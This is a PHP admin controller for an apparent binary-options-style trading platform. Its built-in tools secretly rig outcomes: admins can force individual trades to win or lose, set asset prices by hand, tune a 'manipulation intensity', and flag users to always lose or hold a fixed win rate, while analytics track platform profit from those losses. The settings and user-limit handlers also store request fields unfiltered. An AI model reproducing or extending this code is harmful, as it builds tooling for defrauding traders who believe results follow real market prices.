<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\PredictionTrade;
use App\Models\TradeSetting;
use App\Models\TradeOverride;
use App\Models\UserTradeControl;
use App\Models\User;
use App\Models\TradingAsset;
use App\Services\TradingService;
use App\Services\PriceManipulationService;
use App\Services\WinRateControlService;
use Illuminate\Http\Request;
use Carbon\Carbon;

class TradingDashboardController extends Controller
{
    protected $tradingService;
    protected $priceManipulationService;
    protected $winRateControlService;

    public function __construct(
        TradingService $tradingService,
        PriceManipulationService $priceManipulationService,
        WinRateControlService $winRateControlService
    ) {
        $this->tradingService = $tradingService;
        $this->priceManipulationService = $priceManipulationService;
        $this->winRateControlService = $winRateControlService;
    }

    /**
     * Main admin trading dashboard
     */
    public function index()
    {
        $title = 'Trading Dashboard';
        
        // Get key metrics
        $activeTrades = PredictionTrade::active()->count();
        $todayTrades = PredictionTrade::whereDate('created_at', Carbon::today())->count();
        $todayVolume = PredictionTrade::whereDate('created_at', Carbon::today())->sum('trade_amount');
        $winRateStats = $this->winRateControlService->getWinRateStats(7);
        
        // Recent activity
        $recentTrades = PredictionTrade::with(['user', 'tradingAsset'])
            ->orderBy('created_at', 'desc')
            ->limit(10)
            ->get();
            
        $recentOverrides = TradeOverride::with(['trade.user', 'admin'])
            ->orderBy('created_at', 'desc')
            ->limit(5)
            ->get();

        // Asset performance
        $assetStats = TradingAsset::withCount(['predictionTrades as total_trades'])
            ->withSum('predictionTrades as total_volume', 'trade_amount')
            ->where('is_active', true)
            ->orderBy('total_volume', 'desc')
            ->limit(5)
            ->get();

        return view('admin.trading.dashboard', compact(
            'title', 'activeTrades', 'todayTrades', 'todayVolume', 
            'winRateStats', 'recentTrades', 'recentOverrides', 'assetStats'
        ));
    }

    /**
     * Live trades management
     */
    public function activeTrades(Request $request)
    {
        $title = 'Active Trades Management';
        
        $query = PredictionTrade::with(['user', 'tradingAsset'])->active();
        
        // Filters
        if ($request->filled('asset_id')) {
            $query->where('trading_asset_id', $request->asset_id);
        }
        
        if ($request->filled('user_id')) {
            $query->where('user_id', $request->user_id);
        }
        
        if ($request->filled('prediction')) {
            $query->where('prediction', $request->prediction);
        }

        $activeTrades = $query->orderBy('created_at', 'desc')->paginate(20);
        $assets = TradingAsset::where('is_active', true)->get();
        
        return view('admin.trading.active-trades', compact('title', 'activeTrades', 'assets'));
    }

    /**
     * Trading settings and manipulation controls
     */
    public function tradeSettings()
    {
        $title = 'Trading Settings';
        
        $settings = [
            'global_win_rate' => TradeSetting::get('global_win_rate', 85),
            'default_payout' => TradeSetting::get('default_payout', 180),
            'min_trade_amount' => TradeSetting::get('min_trade_amount', 1.00),
            'max_trade_amount' => TradeSetting::get('max_trade_amount', 1000.00),
            'manipulation_enabled' => TradeSetting::get('manipulation_enabled', true),
            'manipulation_intensity' => TradeSetting::get('manipulation_intensity', 0.3),
            'max_active_trades' => TradeSetting::get('max_active_trades', 5),
            'trading_enabled' => TradeSetting::get('trading_enabled', true),
        ];

        $customWinRateUsers = $this->winRateControlService->getUsersWithCustomWinRates();
        
        return view('admin.trading.settings', compact('title', 'settings', 'customWinRateUsers'));
    }

    /**
     * Update trading settings
     */
    public function updateSettings(Request $request)
    {
        $request->validate([
            'global_win_rate' => 'required|numeric|min:0|max:100',
            'default_payout' => 'required|numeric|min:100|max:300',
            'min_trade_amount' => 'required|numeric|min:0.01',
            'max_trade_amount' => 'required|numeric|min:1',
            'manipulation_intensity' => 'required|numeric|min:0|max:1',
            'max_active_trades' => 'required|integer|min:1|max:50',
        ]);

        foreach ($request->except(['_token', '_method']) as $key => $value) {
            TradeSetting::set($key, $value);
        }

        return redirect()->route('admin.trading.settings')
            ->with('success', 'Trading settings updated successfully!');
    }

    /**
     * Force close a trade
     */
    public function forceCloseTrade(Request $request, PredictionTrade $trade)
    {
        $request->validate([
            'result' => 'required|in:win,loss',
            'reason' => 'required|string|max:500'
        ]);

        if ($request->result === 'win') {
            $result = $this->priceManipulationService->forceTradeWin(
                $trade->id,
                $request->reason,
                auth()->id()
            );
        } else {
            $result = $this->priceManipulationService->forceTradeLoss(
                $trade->id,
                $request->reason,
                auth()->id()
            );
        }

        if ($result['success']) {
            return response()->json([
                'success' => true,
                'message' => $result['message']
            ]);
        }

        return response()->json([
            'success' => false,
            'message' => $result['message']
        ], 400);
    }

    /**
     * Override trade result
     */
    public function overrideTrade(Request $request, PredictionTrade $trade)
    {
        $request->validate([
            'override_type' => 'required|in:force_win,force_loss,price_manipulation',
            'reason' => 'required|string|max:500',
            'new_price' => 'nullable|numeric|min:0'
        ]);

        switch ($request->override_type) {
            case 'force_win':
                $result = $this->priceManipulationService->forceTradeWin(
                    $trade->id, 
                    $request->reason, 
                    auth()->id()
                );
                break;
                
            case 'force_loss':
                $result = $this->priceManipulationService->forceTradeLoss(
                    $trade->id, 
                    $request->reason, 
                    auth()->id()
                );
                break;
                
            case 'price_manipulation':
                $result = $this->priceManipulationService->manipulatePrice(
                    $trade->trading_asset_id,
                    $request->new_price,
                    $request->reason,
                    auth()->id()
                );
                break;
                
            default:
                return response()->json(['success' => false, 'message' => 'Invalid override type'], 400);
        }

        return response()->json($result);
    }

    /**
     * Emergency stop all trading
     */
    public function emergencyStop(Request $request)
    {
        $request->validate([
            'reason' => 'required|string|max:500'
        ]);

        // Disable trading
        TradeSetting::set('trading_enabled', false, 'Emergency stop: ' . $request->reason);
        
        // Close all active trades
        $activeTrades = PredictionTrade::active()->get();
        foreach ($activeTrades as $trade) {
            $trade->closeTrade(null, true);
        }

        return response()->json([
            'success' => true,
            'message' => 'Emergency stop activated. All trading disabled and active trades closed.',
            'closed_trades' => $activeTrades->count()
        ]);
    }

    /**
     * Analytics and reports
     */
    public function analytics(Request $request)
    {
        $title = 'Trading Analytics';
        $days = $request->get('days', 7);
        
        $winRateStats = $this->winRateControlService->getWinRateStats($days);
        $manipulationStats = $this->priceManipulationService->getManipulationStats($days);
        
        // Platform performance
        $since = Carbon::now()->subDays($days);
        $totalVolume = PredictionTrade::where('created_at', '>=', $since)->sum('trade_amount');
        $totalPayouts = PredictionTrade::where('created_at', '>=', $since)
            ->whereNotNull('actual_payout')
            ->sum('actual_payout');
        $platformProfit = $totalVolume - $totalPayouts;
        
        // User statistics
        $topUsers = User::withCount(['predictionTrades as total_trades' => function($query) use ($since) {
                $query->where('created_at', '>=', $since);
            }])
            ->withSum(['predictionTrades as total_volume' => function($query) use ($since) {
                $query->where('created_at', '>=', $since);
            }], 'trade_amount')
            ->orderBy('total_volume', 'desc')
            ->limit(10)
            ->get();

        // Asset performance
        $assetPerformance = TradingAsset::withCount(['predictionTrades as total_trades' => function($query) use ($since) {
                $query->where('created_at', '>=', $since);
            }])
            ->withSum(['predictionTrades as total_volume' => function($query) use ($since) {
                $query->where('created_at', '>=', $since);
            }], 'trade_amount')
            ->orderBy('total_volume', 'desc')
            ->get();

        return view('admin.trading.analytics', compact(
            'title', 'days', 'winRateStats', 'manipulationStats', 
            'totalVolume', 'totalPayouts', 'platformProfit', 
            'topUsers', 'assetPerformance'
        ));
    }

    /**
     * User controls and restrictions
     */
    public function userControls(Request $request)
    {
        $title = 'User Trading Controls';
        
        $query = User::with('tradeControls');
        
        if ($request->filled('search')) {
            $search = $request->search;
            $query->where(function($q) use ($search) {
                $q->where('name', 'like', "%{$search}%")
                  ->orWhere('email', 'like', "%{$search}%")
                  ->orWhere('username', 'like', "%{$search}%");
            });
        }

        $users = $query->paginate(20);
        
        return view('admin.trading.user-controls', compact('title', 'users'));
    }

    /**
     * Update user trading limits
     */
    public function updateUserLimits(Request $request, User $user)
    {
        $request->validate([
            'max_trade_amount' => 'nullable|numeric|min:1',
            'min_trade_amount' => 'nullable|numeric|min:0.01',
            'max_active_trades' => 'nullable|integer|min:1|max:50',
            'daily_trade_limit' => 'nullable|integer|min:1',
            'daily_loss_limit' => 'nullable|numeric|min:1',
            'can_trade' => 'boolean',
            'force_lose' => 'boolean',
            'forced_win_rate' => 'nullable|numeric|min:0|max:100',
            'restriction_reason' => 'nullable|string|max:500'
        ]);

        $controls = UserTradeControl::getForUser($user->id);
        $controls->update($request->all());

        return response()->json([
            'success' => true,
            'message' => 'User trading limits updated successfully!'
        ]);
    }

    /**
     * Detect suspicious trading activity
     */
    public function suspiciousActivity()
    {
        $title = 'Suspicious Activity Detection';
        
        // Users with unusual win rates
        $unusualWinRates = User::withCount(['predictionTrades as total_trades' => function($query) {
                $query->whereIn('status', ['won', 'lost']);
            }])
            ->withCount(['predictionTrades as won_trades' => function($query) {
                $query->where('status', 'won');
            }])
            ->get()
            ->filter(function($user) {
                if ($user->total_trades < 10) return false;
                $winRate = ($user->won_trades / $user->total_trades) * 100;
                return $winRate > 90 || $winRate < 10; // Suspiciously high or low
            });

        // High volume traders today
        $highVolumeTraders = User::withSum(['predictionTrades as today_volume' => function($query) {
                $query->whereDate('created_at', Carbon::today());
            }], 'trade_amount')
            ->orderBy('today_volume', 'desc')
            ->limit(10)
            ->get()
            ->filter(function($user) {
                return $user->today_volume > 5000; // Adjust threshold as needed
            });

        // Rapid trading patterns
        $rapidTraders = User::withCount(['predictionTrades as last_hour_trades' => function($query) {
                $query->where('created_at', '>=', Carbon::now()->subHour());
            }])
            ->orderBy('last_hour_trades', 'desc')
            ->limit(10)
            ->get()
            ->filter(function($user) {
                return $user->last_hour_trades > 20; // More than 20 trades per hour
            });

        return view('admin.trading.suspicious-activity', compact(
            'title', 'unusualWinRates', 'highVolumeTraders', 'rapidTraders'
        ));
    }
}
